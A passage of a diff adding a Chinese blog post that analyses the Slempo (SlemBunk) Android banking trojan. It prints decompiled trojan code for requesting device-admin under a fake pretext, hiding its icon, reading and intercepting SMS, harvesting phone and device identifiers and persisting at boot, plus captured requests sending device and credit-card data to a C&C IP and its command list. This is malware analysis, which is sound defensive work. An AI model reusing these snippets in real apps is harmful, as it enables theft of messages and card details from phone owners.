class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">public void checkDeviceAdmin() &#123;</div><div class="line">        ComponentName v0 = new ComponentName((( Context)this ), MyDeviceAdminReceiver.class );</div><div class="line">        if(!this .deviceManager. isAdminActive(v0)) &#123;</div><div class="line">            Intent v1 = new Intent( "android.app.action.ADD_DEVICE_ADMIN" );</div><div class="line">            v1. putExtra("android.app.extra.DEVICE_ADMIN" , ((Parcelable) v0));</div><div class="line">            v1. putExtra("android.app.extra.ADD_EXPLANATION" , "Get video codec access");</div><div class="line">            this.startActivity (v1 );</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line">##1.3 隐藏图标</div><div class="line">等用户安装完该应用，激活设备管理权限之后，会隐藏图标,比较有意思的隐藏图标的代码有一小段隐藏代码，对于smali可能不好阅读，但是反编译成java之后，这代码就是小菜一碟。</div><div class="line">```java</div><div class="line">if(("3". equals("3")) || ( "3" .equals( "1" ))) &#123;</div><div class="line">            this.getPackageManager ().setComponentEnabledSetting (new ComponentName(((Context )this), Main</div><div class="line">                    . class), 2 , 1);</div><div class="line">``` </div><div class="line">##1.4 计划任务</div><div class="line"></div><div class="line">```java</div><div class="line">private void scheduleLaunch() &#123;</div><div class="line">        Calendar v0 = Calendar .getInstance ();</div><div class="line">        v0. add( 12, this .restartTimeMinutes);</div><div class="line">        Intent v1 = new Intent( "com.slempo.service.activities.HTMLStart" );</div><div class="line">        v1. putExtra("values" , this. getIntent().getStringExtra ("values"));</div><div class="line">        this.am .set (0, v0. getTimeInMillis(), PendingIntent.getBroadcast (((Context) this), 0 , v1 , 0));</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">##1.5获取运行的应用</div><div class="line">slembunk木马会根据当前正在运行的应用来决定是否启用信用卡欺骗页面</div><div class="line">```java</div><div class="line">    private String getTopRunning() &#123;</div><div class="line">        List v1 = this .getSystemService ("activity"). getRunningTasks(1 );</div><div class="line">        String v3 = !v1.isEmpty() ? v1.get(0 ).topActivity. getPackageName() : "" ;</div><div class="line">        return v3;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line">##1.6 获取短信记录</div><div class="line">```java</div><div class="line">public static String readMessagesFromDeviceDB (Context context) &#123;</div><div class="line">        Cursor v8;</div><div class="line">        Uri v1 = Uri .parse ("content://sms/inbox");</div><div class="line">        String[] v2 = new String[]&#123; "_id", "address" , "body", "date"&#125;;</div><div class="line">        JSONArray v12 = new JSONArray();</div><div class="line">        try &#123;</div><div class="line">            v8 = context.getContentResolver ().query (v1 , v2 , null, null, null );</div><div class="line">            if(v8 != null ) &#123;</div><div class="line">                if(!v8.moveToFirst ()) &#123;</div><div class="line">                    goto label_55 ;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                do &#123;</div><div class="line">                    String v6 = v8.getString(v8.getColumnIndex ("address"));</div><div class="line">                    String v7 = v8.getString(v8.getColumnIndex ("body"));</div><div class="line">                    String v9 = new SimpleDateFormat( "dd-MM-yyyy HH:mm:ss" , Locale.US ).format (new Date(</div><div class="line">                            Long.parseLong(v8.getString(v8.getColumnIndex ("date")))));</div><div class="line">                    JSONObject v13 = new JSONObject();</div><div class="line">                    v13. put( "from", v6);</div><div class="line">                    v13. put( "body", v7);</div><div class="line">                    v13. put( "date", v9);</div><div class="line">                    v12. put( v13);</div><div class="line">                    if(v8.moveToNext ()) &#123;</div><div class="line">                        continue;</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    break;</div><div class="line">                &#125;</div><div class="line">                while(true );</div><div class="line">            &#125;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
+<p>##1.6获取电话号码<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">public static String getPhoneNumber(Context context ) &#123;</div><div class="line">        String v0 = context.getSystemService ("phone"). getLine1Number();</div><div class="line">        if(v0 == null || (v0. equals("" ))) &#123;</div><div class="line">            v0 = "";</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return v0;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">##1.7 获取DeviceID</div><div class="line">```java</div><div class="line">  public static String getDeviceId (Context context) &#123;</div><div class="line">        String v1;</div><div class="line">        String v0 = context.getSystemService ("phone"). getDeviceId();</div><div class="line">        if((v0.equals("" )) || v0 == null || (v0.equals("000000000000000" ))) &#123;</div><div class="line">            v0 = Settings$Secure.getString(context.getContentResolver (), "android_id" );</div><div class="line">            if(v0 != null &amp;&amp; !v0. equals("" )) &#123;</div><div class="line">                return v0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            v0 = Build.SERIAL ;</div><div class="line">            if(v0 != null &amp;&amp; !v0. equals("" ) &amp;&amp; !v0. equalsIgnoreCase("unknown" )) &#123;</div><div class="line">                return v0;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            v1 = "not available";</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            v1 = v0;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        return v1;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
+<p>##1.8 设置开机启动<br>木马会被设置成开机启动并且监听外部sd卡，当sd卡准备好之后也会被启动。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:enabled</span>=<span class="string">"true "</span> <span class="attr">android:exported</span>=<span class="string">" true"</span> <span class="attr">android:name</span>=<span class="string">".reiujdksmcoiwerj "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:enabled</span>=<span class="string">"true "</span> <span class="attr">android:exported</span>=<span class="string">" true"</span> <span class="attr">android:name</span>=<span class="string">".hujnkij8uijkjlmj "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.BOOT_COMPLETED "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>##1.9 监听短信<br>木马通过短信下发cc指令,从如下AndroidMenifest.xml部分文件可看出，木马对短信应用进行监听，并且权限高于系统短信应用。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt; <span class="attr">receiver</span> <span class="attr">android:enabled</span> =<span class="string">"true"</span> <span class="attr">android:exported</span>=<span class="string">"true "</span> <span class="attr">android:name</span>=<span class="string">".riejkmdcwepoksmieru "</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">"999 "</span>&gt;</span></div><div class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.provider.Telephony.SMS_RECEIVED "</span> /&gt;</span></div><div class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></div><div class="line">``` </div><div class="line">下面是recevier的onReceive方法：</div><div class="line">```java</div><div class="line">    public void onReceive(Context context, Intent intent ) &#123;</div><div class="line">        SharedPreferences v8 = context.getSharedPreferences ("AppPrefs", 0);</div><div class="line">        new HashSet ();</div><div class="line">        try &#123;</div><div class="line">            Object v1 = DATAWraper .deserialize (v8 .getString ("BLOCKED_NUMBERS", DATAWraper.serialize(</div><div class="line">                    new HashSet ())));</div><div class="line">        &#125;</div><div class="line">        catch(Exception v2 ) &#123;</div><div class="line">            v2. printStackTrace();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        Map v3 = SendSMSRecevier .retrieveMessages (intent );</div><div class="line">        Iterator v10 = v3.keySet().iterator ();</div><div class="line">        while(v10.hasNext()) &#123;</div><div class="line">            Object v7 = v10.next();</div><div class="line">            CommandCenter v6 = new CommandCenter( v3. get( v7), "", context);</div><div class="line">            if(v6.processCommand ()) &#123;</div><div class="line">                this.abortBroadcast ();</div><div class="line">                continue;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            boolean v4 = v6.needToInterceptIncoming ();</div><div class="line">            boolean v5 = v6.needToListen ();</div><div class="line">            if(!v4 &amp;&amp; !((HashSet )v1 ).contains (v7 )) &#123;</div><div class="line">                if(!v5) &#123;</div><div class="line">                    continue;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                SendData.sendListenedIncomingSMS (context , v3 .get (v7 ), ((String)v7));</div><div class="line">                continue;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            SendData.sendInterceptedIncomingSMS (context , v3 .get (v7 ), ((String)v7));</div><div class="line">            this.abortBroadcast ();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">``` </div><div class="line"></div><div class="line">#2 木马工作流程</div><div class="line">木马在AndroidManifest.xml中监听了SMS_RECEIVED，ACTION_EXTERNAL_APPLICATIONS_AVAILABLE，BOOT_COMPLETED，DEVICE_ADMIN_ENABLED，com.slempo.service.activities.HTMLStart这五个action，同时注册了几个activity和一个service，除主activity外，其他都是一些欺骗页面，service则负责启动相应activity，请求设备管理权限等。下面简单看下代码流程：</div><div class="line">![][1]</div><div class="line">在main activity中会启动MainServiceStart服务，这个服务会启动三个线程周期性轮询，判断当前应用启动伪信用卡界面；请求deviceAdmin权限；判断指令启动相应的伪界面；发送电话，ime等敏感信息。发送敏感信息的请求如下：</div></pre></td></tr></table></figure></p>
+<p>POST / HTTP/1.1<br>Content-Length: 481<br>Content-Type: text/plain; charset=UTF-8<br>Host: 181.174.164.25:2080<br>Connection: Keep-Alive<br>User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)</p>
+<p>{“os”:”4.0.4”,”model”:”Unknown sdk”,”phone number”:”15555215554”,”apps”:[“com.android.gesture.builder”,”com.android.widgetpreview”,”com.example.android.apis”,”com.example.android.livecubes”,”com.example.android.softkeyboard”,”com.joeykrim.rootcheck”,”de.robv.android.xposed.installer”,”de.robv.android.xposed.installer.staticbusybox”,”eu.chainfire.supersu”,”org.slempo.service”],”imei”:”8f986e65d50f299a”,”client number”:”3”,”type”:”device info”,”operator”:”310260”,”country”:”US”}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line">前面也说到了木马会根据当前正在运行的应用来决定是否启动伪信用卡页面，伪界面如下</div><div class="line">![添加信用卡][2]</div><div class="line">![添加详细信息][3]</div><div class="line">木马作者对上述用户信息做了严格校验，首先是信用卡信息必须合法，其次过期时间必须在2014到2020年之间，到了信用卡地址信息页面，对邮政编码和电话号码做了严格的关联，用户填完所有信息之后就会发送给c&amp;c主机，请求如下：</div></pre></td></tr></table></figure></p>
+<p>POST / HTTP/1.1<br>Content-Length: 401<br>Content-Type: text/plain; charset=UTF-8<br>Host: 181.174.164.25:2080<br>Connection: Keep-Alive<br>User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)</p>
+<p>{“data”:{“additional information”:{“old vbv password”:”123456”,”vbv password”:”qwerty”},”type”:”card information”,”card”:{“cvc”:”393”,”month”:”12”,”year”:”15”,”number”:”4024 0238 6573 0515”},”billing address”:{“date of birth”:”01.03.1990”,”phone number”:”212-925-2355”,”street address”:”dalianganjinzi”,”zip code”:”10002”,”phone prefix”:”+1”,”name on card”:”Zhanghua”}},”type”:”user data”,”code”:”-1”}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">附录 c&amp;c指令</div></pre></td></tr></table></figure></p>
+<p>CommandCenter.commands. add(“#intercept_sms_start”);<br>CommandCenter.commands .add (“#intercept_sms_stop”)<br>CommandCenter.commands .add (“#block_numbers”);<br>CommandCenter.commands .add (“#unblock_all_numbers”);<br>CommandCenter.commands .add (“#unblock_numbers”);<br>CommandCenter.commands .add (“#lock”);<br>CommandCenter.commands .add (“#unlock”);<br>CommandCenter.commands .add (“#send” + “_sms”);<br>CommandCenter.commands .add (“#forward” + “_calls”);<br>CommandCenter.commands .add (“#disable_forward_calls”);<br>CommandCenter.commands .add (“#control_number”);<br>CommandCenter.commands .add (“#update_html”);<br>CommandCenter.commands .add (“#show_html”);<br>CommandCenter.commands .add (“#wipe_data”);<br>```</p>
 
           
         
@@ -659,6 +2262,10 @@
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -701,7 +2308,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-count">17</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -712,7 +2319,7 @@
             
             <div class="site-state-item site-state-categories">
               
-                <span class="site-state-item-count">1</span>
+                <span class="site-state-item-count">9</span>
                 <span class="site-state-item-name">分类</span>
               
             </div>
@@ -723,7 +2330,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">4</span>
+                <span class="site-state-item-count">65</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
